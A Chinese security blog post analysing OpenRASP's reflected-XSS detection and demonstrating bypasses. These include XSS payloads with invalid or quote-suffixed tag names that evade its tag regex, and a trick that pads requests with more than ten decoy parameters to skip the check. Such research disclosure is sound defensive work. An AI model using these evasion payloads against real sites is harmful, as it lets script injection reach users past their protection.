> 原文链接: https://www.anquanke.com//post/id/247612 


# OpenRASP xss算法的几种绕过方法


                                阅读量   
                                **66447**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t012b1bfb13be0028d0.png)](https://p3.ssl.qhimg.com/t012b1bfb13be0028d0.png)



openrasp默认只能检测反射型XSS，存储型XSS仅IAST商业版支持。对于反射型xss，openrasp也只能检测可控输出点在html标签外的情况，本文的绕过方法是针对这种情况。如果可控输出点在html标签内，如`&lt;input type="text" value="$input"&gt;`或`&lt;script&gt;...&lt;/script&gt;` 内部，openrasp几乎检测不到。



## 测试环境

windows / tomcat / jdk1.8 / openrasp 1.3.7-beta

测试环境部署参见[https://www.anquanke.com/post/id/241107](https://www.anquanke.com/post/id/241107)，或者官网文档。

在official.js中xss_userinput算法默认配置为ignore，修改为block来开启拦截。此时点击官方测试用例中下面链接，即可触发openrasp拦截。

[![](https://p3.ssl.qhimg.com/t01356f49ca51bf9ffe.png)](https://p3.ssl.qhimg.com/t01356f49ca51bf9ffe.png)

[![](https://p5.ssl.qhimg.com/t01940339fb313fdf9b.png)](https://p5.ssl.qhimg.com/t01940339fb313fdf9b.png)



## openrasp xss算法

openrasp xss算法有2种。算法1是针对PHP环境，此处不考虑。算法2是用户输入匹配算法，根据注释说明，算法原理是”当用户输入长度超过15，匹配上标签正则，且出现在响应里，直接拦截”。

[![](https://p0.ssl.qhimg.com/t0136744832f3ec0696.png)](https://p0.ssl.qhimg.com/t0136744832f3ec0696.png)

标签正则含义使用regexper网站解析如下

[![](https://p0.ssl.qhimg.com/t01af305b14a63132a6.png)](https://p0.ssl.qhimg.com/t01af305b14a63132a6.png)

标签正则从整体上来说匹配两种情况，一是请求参数值中有子字符串以`&lt;!` 开头的；二是请求参数值中有子字符串以`&lt;` 开头的。对于第二种情况，标签正则会匹配`&lt;` 字符后接1到12个大小写字母，再后接`/` 或`&gt;` 或`0x00 - 0x20` 字符的字符串。所以下面这些常见的xss测试payload都会拦截。

```
&lt;script&gt;alert(1)&lt;/script&gt;         // "&lt;script&gt;"部分匹配标签正则
&lt;img src=1 onerror=alert()&gt;       // "&lt;img "部分匹配正则，空格符对应正则中0x20
&lt;svg/onload=alert()&gt;              //  "&lt;svg/"部分匹配正则

```

`&lt;img src=1 onerror=alert()&gt;`触发拦截

[![](https://p4.ssl.qhimg.com/t014936125b67fb01b8.png)](https://p4.ssl.qhimg.com/t014936125b67fb01b8.png)



## 标签正则绕过

整理网上的一些xss 绕过payload，发现下面这些可以顺利绕过标签正则

```
&lt;d3v/onmouseleave=[1].some(confirm)&gt;click
&lt;d3/onmouseenter=[2].find(confirm)&gt;z
&lt;d3"&lt;"/onclick="1&gt;[confirm``]"&lt;"&gt;z
&lt;w="/x="y&gt;"/ondblclick=`&lt;`[confir\u006d``]&gt;z
```

浏览器直接输入上面那些xss payload会报400响应错误。对payload进行url编码所有字符。

[![](https://p2.ssl.qhimg.com/t018840de1306ca138e.png)](https://p2.ssl.qhimg.com/t018840de1306ca138e.png)

burpsuite repeater中右键”copy url”，复制url到浏览器中访问，点击即可触发弹框。

[![](https://p4.ssl.qhimg.com/t011fbad0a21551c801.png)](https://p4.ssl.qhimg.com/t011fbad0a21551c801.png)

### <a class="reference-link" name="%E6%A0%87%E7%AD%BE%E5%90%8E%E6%8E%A5%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"></a>标签后接单双引号

收集过程中还发现下面这两种xss payload也可以绕过。

```
&lt;a"/onclick=(confirm)()&gt;click 
&lt;a'/onclick=(confirm)()&gt;click
```

简单测了下其他标签后接单引号或双引号进行绕过，好像蛮多都行的。

```
&lt;button onclick=alert()&gt;12&lt;/button&gt;    // 拦截
&lt;button' onclick=alert()&gt;12&lt;/button&gt;   // 点击弹框
&lt;button" onclick=alert()&gt;12&lt;/button&gt;   // 点击弹框
&lt;div onclick=alert()&gt;12&lt;/div&gt;          // 拦截
&lt;div' onclick=alert()&gt;12&lt;/div&gt;         // 点击弹框
&lt;div" onclick=alert()&gt;12&lt;/div&gt;         // 点击弹框
```

例如，使用`123&lt;img' src=1 onclick=alert()&gt;123` ，url编码后，点击也能弹框。

[![](https://p1.ssl.qhimg.com/t01a647ed530b4d24f9.png)](https://p1.ssl.qhimg.com/t01a647ed530b4d24f9.png)

### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E6%97%A0%E6%95%88%E6%A0%87%E7%AD%BE"></a>构造无效标签

这种也可以用于绕过openrasp。看到这种绕过方式，感觉前面的都不香了。

[![](https://p3.ssl.qhimg.com/t0164f0fc49f94ded5e.png)](https://p3.ssl.qhimg.com/t0164f0fc49f94ded5e.png)

只要构造如下payload即可

```
&lt;abc1 onclick=confirm()&gt;click here   // 标签名是字母+数字
```

验证如下

[![](https://p5.ssl.qhimg.com/t0114f6e8a35ad706fc.png)](https://p5.ssl.qhimg.com/t0114f6e8a35ad706fc.png)

或者

```
&lt;abcdefabcdefa onclick=confirm()&gt;click here   // 标签名称长度大于12
```

[![](https://p4.ssl.qhimg.com/t019a8c1820a9f4a76d.png)](https://p4.ssl.qhimg.com/t019a8c1820a9f4a76d.png)



## 程序逻辑绕过

还有一种绕过方法，是从程序检测逻辑上进行绕过。

openrasp xss具体检测代码实现在这个文件中`agent/java/engine/src/main/java/com/baidu/openrasp/plugin/checker/local/XssChecker.java`。下面的一段代码是对”当用户输入长度超过15，匹配上标签正则，且出现在响应里，直接拦截”的具体实现。

[![](https://p1.ssl.qhimg.com/t014e85bbfecb259241.png)](https://p1.ssl.qhimg.com/t014e85bbfecb259241.png)

但代码中多了一处逻辑。如果请求会传递多个参数，当某个参数值长度大于15，且匹配之前的标签正则`&lt;![\-\[A-Za-z]|&lt;([A-Za-z]`{`1,12`}`)[\/\x00-\x20&gt;]` ，如果对应参数值没有在响应中出现时，变量count值会加1。当count值大于10时，openrasp会直接放行。控制程序运行到上面图片中第二个方框中即可产生绕过。

### <a class="reference-link" name="%E7%BB%95%E8%BF%87%E6%BC%94%E7%A4%BA"></a>绕过演示

此处为了查看payload内容方便，使用了post请求。如果转换成get请求，并对参数值url编码，效果一样。

原始请求会触发拦截

[![](https://p0.ssl.qhimg.com/t0159aca56387091f9d.png)](https://p0.ssl.qhimg.com/t0159aca56387091f9d.png)

绕过payload。在input参数前面添加多个input[n]的参数，且参数值为其他xss payload。

[![](https://p2.ssl.qhimg.com/t01f0d25049eabe8618.png)](https://p2.ssl.qhimg.com/t01f0d25049eabe8618.png)

转换成get请求，并对payload进行编码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f387d753c363ba30.png)

### <a class="reference-link" name="%E7%BB%95%E8%BF%87payload%E5%88%86%E6%9E%90"></a>绕过payload分析

构造的绕过payload有几点要求。一是，虚构的请求参数理论上至少要有11个，如前面input0到input11请求参数。如果没成功，最好在增加几个请求参数。二是，虚构的请求参数名取值有些要求。三是，虚构的请求参数值不能与真实请求参数值相同。

因为这样的话，input0到input11这些请求参数在`parameterMap` 中会排在input参数前面，见下图。

[![](https://p4.ssl.qhimg.com/t01a7ace01a2b6f2703.png)](https://p4.ssl.qhimg.com/t01a7ace01a2b6f2703.png)

这样input0到input11这些参数就会优先input请求参数被openrasp检测逻辑处理，从而击中`count &gt; exceedLengthCount` 的条件进行绕过。



## 参考资料

[https://github.com/s0md3v/AwesomeXSS#awesome-tags—event-handlers](https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers)

[https://www.anquanke.com/post/id/173701](https://www.anquanke.com/post/id/173701)

[https://www.yuque.com/pmiaowu/web_security_1/scwgqm#JFw3a](https://www.yuque.com/pmiaowu/web_security_1/scwgqm#JFw3a)
